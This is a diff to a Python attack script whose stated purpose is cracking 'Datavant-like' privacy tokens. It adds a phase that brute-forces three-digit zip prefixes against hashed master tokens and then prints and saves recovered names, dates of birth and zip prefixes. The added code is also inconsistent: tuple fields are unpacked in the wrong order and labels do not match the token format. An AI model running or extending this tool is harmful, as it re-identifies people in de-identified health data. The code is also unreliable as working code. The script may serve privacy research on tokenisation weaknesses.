@@ -98,6 +98,10 @@ def mk_T4(ln: str, fn: str, g: str, dob: str) -> str:
     if not (ln and fn and g and dob): return ""
     return f"{norm(ln)}|{norm(fn)}|{norm_gender(g)}|{dob}"
 
+def mk_T3(ln: str, fi: str, dob: str, zip3: str) -> str:
+    if not (ln and fi and dob and zip3): return ""
+    return f"{norm(ln)}|{fi}|{dob}|{zip3}"
+
 # =============================
 # Load and decrypt site tokens
 # =============================
@@ -227,6 +231,23 @@ def pivot_to_T4_from_T1_T2(master_func,
             out[mt] = (ln, norm(fn), g, dob)
     return out
 
+def pivot_to_T3_from_T4(master_func,
+                        T3_master_tokens: Set[bytes],
+                        t4_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str,str,str]]:
+    """
+    Use knowledge from T4 (ln|fn|g|dob) to brute-force T3 (ln|fn|dob|zip3).
+    """
+    ln, fn, g, dob = t4_hit
+    out = {}
+    for zip3 in (f"{i:03}" for i in range(1000)):  # Iterate from 000 to 999
+        t3_inp = f"{ln}|{norm(fn)}|{dob}|{zip3}"
+        if not t3_inp:
+            continue
+        mt = master_func(t3_inp)
+        if mt in T3_master_tokens:
+            out[mt] = (ln, norm(fn), dob, zip3)
+    return out
+
 # =============================
 # Orchestrator
 # =============================
@@ -292,6 +313,15 @@ def run_attack(args):
                 t4_pivot_hits.update(out)
         print(f"    -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
 
+    # Phase 3: pivot into t3 using knowledge from t4
+    t3_pivot_hits = {}
+    if "T3" in dec and t4_pivot_hits:
+        print("[*] Pivoting to T3 (ln|fi|g|dob|zip3) using T4...")
+        for mt4, (ln, fi, dob, zip3) in t4_pivot_hits.items():
+            out = pivot_to_T3_from_T4(master_func, dec["T3"], (ln, fi, dob, zip3))
+            t3_pivot_hits.update(out)
+        print(f"    -> Resolved {len(t3_pivot_hits)} T3 preimages via pivot")
+
     # Report
     print("\n=== RESULTS ===")
     if t1_hits:
@@ -306,6 +336,10 @@ def run_attack(args):
         print(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)")
         for mt, tpl in list(t4_pivot_hits.items())[:20]:
             print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fn={tpl[1]} g={tpl[2]} dob={tpl[3]}")
+    if t3_pivot_hits:
+        print(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)")
+        for mt, tpl in list(t3_pivot_hits.items())[:20]:
+            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} dob={tpl[2]} zip3={tpl[3]}")
 
     # Save results to a text file
     with open(args.outfile, "w", encoding="utf-8") as result_file:
@@ -321,6 +355,10 @@ def run_attack(args):
             result_file.write(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)\n")
             for mt, tpl in t4_pivot_hits.items():
                 result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fn={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
+        if t3_pivot_hits:
+            result_file.write(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)\n")
+            for mt, tpl in t3_pivot_hits.items():
+                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} dob={tpl[2]} zip3={tpl[3]}\n")
 
 def main():
     ap = argparse.ArgumentParser(description="Attack Datavant-like tokens: decrypt site tokens, crack low-entropy keys, pivot to higher-entropy.")
